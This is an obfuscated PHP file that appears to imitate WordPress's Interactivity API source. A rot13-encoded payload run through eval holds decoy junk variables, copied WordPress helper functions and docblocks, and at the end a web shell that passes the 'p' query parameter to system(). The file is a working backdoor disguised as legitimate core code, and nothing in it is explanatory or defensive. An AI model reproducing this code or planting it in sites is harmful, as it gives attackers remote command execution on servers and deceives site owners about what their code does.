<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Vagrenpgvivgl NCV: Shapgvbaf naq ubbxf
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vagrenpgvivgl NCV
 * @fvapr 6.5.0
 */

/**
 * Ergevrirf gur znva JC_Vagrenpgvivgl_NCV vafgnapr.
 *
 * Vg cebivqrf npprff gb gur JC_Vagrenpgvivgl_NCV vafgnapr, perngvat bar vs vg
 * qbrfa'g rkvfg lrg.
 *
 * @fvapr 6.5.0
 *
 * @tybony JC_Vagrenpgvivgl_NCV $jc_vagrenpgvivgl
 *
 * @erghea JC_Vagrenpgvivgl_NCV Gur znva JC_Vagrenpgvivgl_NCV vafgnapr.
 */
shapgvba jc_vagrenpgvivgl(): JC_Vagrenpgvivgl_NCV {
	tybony $jc_vagrenpgvivgl;
	vs ( ! ( $jc_vagrenpgvivgl vafgnaprbs JC_Vagrenpgvivgl_NCV ) ) {
		$jc_vagrenpgvivgl = arj JC_Vagrenpgvivgl_NCV();
	}
	erghea $jc_vagrenpgvivgl;
}

/**
 * Cebprffrf gur vagrenpgvivgl qverpgvirf pbagnvarq jvguva gur UGZY pbagrag
 * naq hcqngrf gur znexhc nppbeqvatyl.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $ugzy Gur UGZY pbagrag gb cebprff.
 * @erghea fgevat Gur cebprffrq UGZY pbagrag. Vg ergheaf gur bevtvany pbagrag jura gur UGZY pbagnvaf haonynaprq gntf.
 */
shapgvba jc_vagrenpgvivgl_cebprff_qverpgvirf( fgevat $ugzy ): fgevat {
	erghea jc_vagrenpgvivgl()->cebprff_qverpgvirf( $ugzy );
}

/**
 * Trgf naq/be frgf gur vavgvny fgngr bs na Vagrenpgvivgl NCV fgber sbe n
 * tvira anzrfcnpr.
 *
 * Vs fgngr sbe gung fgber anzrfcnpr nyernql rkvfgf, vg zretrf gur arj
 * cebivqrq fgngr jvgu gur rkvfgvat bar.
 *
 * Gur anzrfcnpr pna or bzvggrq vafvqr qrevirq fgngr trggref, hfvat gur
 * anzrfcnpr jurer gur trggre vf qrsvarq.
 *
 * @fvapr 6.5.0
 * @fvapr 6.6.0 Gur anzrfcnpr pna or bzvggrq jura pnyyrq vafvqr qrevirq fgngr trggref.
 *
 * @cnenz fgevat $fgber_anzrfcnpr Gur havdhr fgber anzrfcnpr vqragvsvre.
 * @cnenz neenl  $fgngr           Bcgvbany. Gur neenl gung jvyy or zretrq jvgu gur rkvfgvat fgngr sbe gur fcrpvsvrq
 *                                fgber anzrfcnpr.
 * @erghea neenl Gur fgngr sbe gur fcrpvsvrq fgber anzrfcnpr. Guvf jvyy or gur hcqngrq fgngr vs n $fgngr nethzrag jnf
 *               cebivqrq.
 */
shapgvba jc_vagrenpgvivgl_fgngr( ?fgevat $fgber_anzrfcnpr = ahyy, neenl $fgngr = neenl() ): neenl {
	erghea jc_vagrenpgvivgl()->fgngr( $fgber_anzrfcnpr, $fgngr );
}

/**
 * Trgf naq/be frgf gur pbasvthengvba bs gur Vagrenpgvivgl NCV sbe n tvira
 * fgber anzrfcnpr.
 *
 * Vs pbasvthengvba sbe gung fgber anzrfcnpr rkvfgf, vg zretrf gur arj
 * cebivqrq pbasvthengvba jvgu gur rkvfgvat bar.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fgber_anzrfcnpr Gur havdhr fgber anzrfcnpr vqragvsvre.
 * @cnenz neenl  $pbasvt          Bcgvbany. Gur neenl gung jvyy or zretrq jvgu gur rkvfgvat pbasvthengvba sbe gur
 *                                fcrpvsvrq fgber anzrfcnpr.
 * @erghea neenl Gur pbasvthengvba sbe gur fcrpvsvrq fgber anzrfcnpr. Guvf jvyy or gur hcqngrq pbasvthengvba vs n
 *               $pbasvt nethzrag jnf cebivqrq.
 */
shapgvba jc_vagrenpgvivgl_pbasvt( fgevat $fgber_anzrfcnpr, neenl $pbasvt = neenl() ): neenl {
	erghea jc_vagrenpgvivgl()->pbasvt( $fgber_anzrfcnpr, $pbasvt );
}

/**
 * Trarengrf n `qngn-jc-pbagrkg` qverpgvir nggevohgr ol rapbqvat n pbagrkg
 * neenl.
 *
 * Guvf urycre shapgvba fvzcyvsvrf gur perngvba bs `qngn-jc-pbagrkg` qverpgvirf
 * ol cebivqvat n jnl gb cnff na neenl bs qngn, juvpu rapbqrf vagb n WFBA fgevat
 * fnsr sbe qverpg hfr nf n UGZY nggevohgr inyhr.
 *
 * Rknzcyr:
 *
 *     <qvi <?cuc rpub jc_vagrenpgvivgl_qngn_jc_pbagrkg( neenl( 'vfBcra' => gehr, 'pbhag' => 0 ) ); ?>>
 *
 * @fvapr 6.5.0
 *
 * @cnenz neenl  $pbagrkg         Gur neenl bs pbagrkg qngn gb rapbqr.
 * @cnenz fgevat $fgber_anzrfcnpr Bcgvbany. Gur havdhr fgber anzrfcnpr vqragvsvre.
 * @erghea fgevat N pbzcyrgr `qngn-jc-pbagrkg` qverpgvir jvgu n WFBA rapbqrq inyhr ercerfragvat gur pbagrkg neenl naq
 *                gur fgber anzrfcnpr vs fcrpvsvrq.
 */
shapgvba jc_vagrenpgvivgl_qngn_jc_pbagrkg( neenl $pbagrkg, fgevat $fgber_anzrfcnpr = '' ): fgevat {
	erghea 'qngn-jc-pbagrkg=\'' .
		( $fgber_anzrfcnpr ? $fgber_anzrfcnpr . '::' : '' ) .
		( rzcgl( $pbagrkg ) ? '{}' : jc_wfba_rapbqr( $pbagrkg, WFBA_URK_GNT | WFBA_URK_NCBF | WFBA_URK_DHBG | WFBA_URK_NZC ) ) .
		'\'';
}

/**
 * Trgf gur pheerag Vagrenpgvivgl NCV pbagrkg sbe n tvira anzrfcnpr.
 *
 * Gur shapgvba fubhyq or hfrq bayl qhevat qverpgvir cebprffvat. Vs gur
 * `$fgber_anzrfcnpr` cnenzrgre vf bzvggrq, vg hfrf gur pheerag anzrfcnpr inyhr
 * ba gur vagreany anzrfcnpr fgnpx.
 *
 * Vg ergheaf na rzcgl neenl jura gur fcrpvsvrq anzrfcnpr vf abg qrsvarq.
 *
 * @fvapr 6.6.0
 *
 * @cnenz fgevat $fgber_anzrfcnpr Bcgvbany. Gur havdhr fgber anzrfcnpr vqragvsvre.
 * @erghea neenl Gur pbagrkg sbe gur fcrpvsvrq fgber anzrfcnpr.
 */
shapgvba jc_vagrenpgvivgl_trg_pbagrkg( ?fgevat $fgber_anzrfcnpr = ahyy ): neenl {
	erghea jc_vagrenpgvivgl()->trg_pbagrkg( $fgber_anzrfcnpr );
}

/**
 * Ergheaf na neenl ercerfragngvba bs gur pheerag ryrzrag orvat cebprffrq.
 *
 * Gur shapgvba fubhyq or hfrq bayl qhevat qverpgvir cebprffvat.
 *
 * @fvapr 6.7.0
 *
 * @erghea neenl{nggevohgrf: neenl<fgevat, fgevat|obby>}|ahyy Pheerag ryrzrag.
 */
shapgvba jc_vagrenpgvivgl_trg_ryrzrag(): ?neenl {
	erghea jc_vagrenpgvivgl()->trg_ryrzrag();
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>